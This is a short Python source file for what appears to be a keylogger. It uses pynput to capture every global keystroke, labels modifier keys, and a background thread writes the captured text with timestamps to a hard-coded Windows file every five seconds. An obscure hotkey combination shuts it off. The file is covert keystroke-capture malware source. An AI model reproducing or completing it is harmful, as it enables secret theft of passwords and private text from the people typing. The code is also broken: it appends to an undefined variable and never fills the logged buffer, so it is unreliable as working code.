from pynput import keyboard, mouse
from datetime import datetime as dt
import time
import threading

killSwitch = False
currTime = dt.now().strftime('%d/%m/%Y %H:%M:%S - ')
letter = ''
capsOn = False
word = ''

def update():
    while True:
        global word
        time.sleep(5)
        writeToFile(word)
        word = ''
        if(killSwitch):
            return False


threading.Thread(target=update).start()

def writeToFile(text):
    with open(r"C:\HomeSchool\testfile123.txt", 'a+') as f:
        try:
            f.write(dt.now().strftime('%d/%m/%Y %H:%M:%S - ') + str(text) + '\n')
        except:
            global killSwitch
            killSwitch = True


def on_press(key):
    global capsOn
    global letter
    global word
    try:
        letter = '{0}'.format(key.char)
        if(capsOn):
            letter = letter.upper()
    except AttributeError:
        match key:
            case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r:
                letter = '[CTRL]'
            case keyboard.Key.alt_l | keyboard.Key.alt_gr:
                letter = '[ALT]'
            case keyboard.Key.space:
                letter = ' '
            case keyboard.Key.backspace:
                letter = '[BACKSPACE]'
            case keyboard.Key.tab:
                letter = '[TAB]'
            case keyboard.Key.delete:
                letter = '[DELETE]'
            case keyboard.Key.enter:
                letter = '[ENTER]\n'
            case keyboard.Key.caps_lock:
                capsOn = not capsOn
                if(capsOn):
                    letter = '[CAPSLOCK ON]'
                else:
                    letter = '[CAPSLOCK OFF]'
            case keyboard.Key.shift | keyboard.Key.shift_r:
                letter = '[SHIFT]'
    finally:
        phrase = phrase + letter
            
        
def on_release(key):
    #writeToFile('{0} released'.format(
    #    key))
    global capsOn
    global letter
    global killSwitch
    try:
        if(killSwitch):
            return False
    except:
        print('operation could not commence TT')
            
def kill_prog():
    global killSwitch
    killSwitch = True


listener = keyboard.GlobalHotKeys({
        '<ctrl>+<shift>+f+<up>+<down>': kill_prog})
listener.start()

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()




